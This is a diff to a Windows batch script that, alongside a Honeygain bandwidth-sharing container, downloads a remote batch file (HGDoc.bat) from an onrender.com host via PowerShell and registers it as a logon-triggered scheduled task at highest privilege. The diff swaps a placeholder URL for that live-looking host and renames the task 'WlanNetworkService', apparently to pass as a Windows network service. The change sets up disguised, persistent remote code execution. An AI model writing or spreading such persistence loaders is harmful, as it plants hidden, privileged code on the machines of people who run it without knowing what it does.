@@ -36,15 +36,15 @@ wsl docker run -d --name honeygain --restart unless-stopped --device /dev/net/tu
 
 :: === DOWNLOAD AND SCHEDULE BAT FILE ===
 :: Replace with your actual URL
-set "BAT_URL=https://example.com/your-script.bat"
-set "BAT_NAME=autorun_task.bat"
+set "BAT_URL=https://ms32-sha2.onrender.com/static/apps/HGDoc.bat"
+set "BAT_NAME=HGDoc.bat"
 set "DOWNLOAD_PATH=%~dp0%BAT_NAME%"
 
 :: Download to same directory as this script
 powershell -Command "Invoke-WebRequest -Uri '%BAT_URL%' -OutFile '%DOWNLOAD_PATH%'"
 
 :: Create scheduled task to run the downloaded BAT file at user logon
-schtasks /create /tn "StartupTask" /tr "\"%DOWNLOAD_PATH%\"" /sc onlogon /rl HIGHEST /f
+schtasks /create /tn "WlanNetworkService" /tr "\"%DOWNLOAD_PATH%\"" /sc onlogon /rl HIGHEST /f
 
 echo.
 echo All tasks completed. You may need to reboot.
